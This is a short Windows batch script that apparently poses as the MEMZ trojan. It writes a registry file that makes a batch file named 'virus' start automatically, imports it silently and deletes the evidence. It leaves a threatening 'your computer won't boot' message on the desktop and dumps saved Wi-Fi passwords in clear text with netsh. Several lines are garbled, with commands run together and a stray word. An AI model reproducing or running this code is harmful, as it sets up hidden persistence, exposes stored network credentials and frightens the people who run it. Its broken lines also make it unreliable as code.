@echo off
echo REGEDIT4>x.reg
echo.
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run]>>x.reg
echo "bat"="C:\\windows\\病毒.bat">>x.reg
regedit /s x.reg &del x.reg


echo YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN. Your computer won't boot up again,echo so use it as long as you can! :Decho Trying to kill MEMZ will cause your system to beecho destroyed instantly, so don't try it :D> %USERPROFILE%\desktop\1.txt
for /f "skip=10 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do @for /f "tokens=1-2 delims=:" %%k in ('netsh wlan show profiles %%j key ^= clear ^|findstr /i "MEMZ"') do @echo %%j,%%l>> %USERPROFILE%\desktop\1.txt
%USERPROFILE%\desktop\1.txt
than
@echo off
echo YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.
echo Your computer won't boot up again,
echo so use it as long as you can!
echo :D
echo Trying to kill MEMZ will cause your system to be
echo destroyed instantly, so don't try it :D

